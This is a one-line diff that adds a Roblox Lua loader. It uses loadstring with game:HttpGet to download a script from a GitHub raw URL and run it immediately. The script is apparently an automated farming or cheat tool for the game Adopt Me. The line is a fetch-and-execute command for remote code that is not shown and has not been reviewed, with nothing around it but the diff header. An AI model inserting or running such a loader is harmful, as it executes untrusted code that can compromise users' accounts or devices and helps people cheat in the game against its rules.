@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Amivictim/adoptmefarm/refs/heads/main/AdoptMeFarm_public.lua"))()
